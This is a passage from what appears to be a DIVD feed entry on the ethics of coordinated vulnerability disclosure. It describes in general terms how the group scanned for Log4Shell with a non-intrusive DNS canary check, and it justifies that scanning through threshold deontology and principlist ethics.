without triggering the vulnerability itself. The considerations central to the WIDE heuristic helped to assess this approach: where many actors were mass-exploiting systems at random to test for the vulnerability, DIVD’s scanning methodology was deliberately deweaponized to reduce exploitability and kept as non-intrusive as possible by avoiding persistence or harmful effects. To achieve this, DIVD created a Log4Shell exploit that triggered a single DNS request to a Canary Token from inside the vulnerable system: an approach that was harmless and, of all options, the least intrusive. It only revealed the vulnerable IP address and nothing more. The actions taken were designed to be ethical: proportionate to the risk, grounded in subsidiarity, and subject to public scrutiny. In doing so, we aimed to maximize beneficence, minimize maleficence, respect justice, and uphold explicability—even where autonomy had to be limited for the sake of public safety. Conclusion: Trust through transparent ethics Coordinated Vulnerability Disclosure isn’t just a technical challenge: it’s an ethical one. At DIVD, we don’t treat unsolicited scanning and disclosure as a loophole or an afterthought. We treat it as an action that requires justification, restraint, and transparency. Threshold deontology provides us with the ethical architecture to act decisively when society is at risk. The principlist framework implicitly helps us navigate that threshold with clarity, so we’re not acting on instinct, but on structured ethical reasoning. I’m sharing this to explain how I think about the ethics behind unsolicited disclosure. Not because we see ourselves as above ethical rules at DIVD, but because we try to follow them as rigorously as possible, even when the path forward isn’t obvious.]]></summary></entry></feed>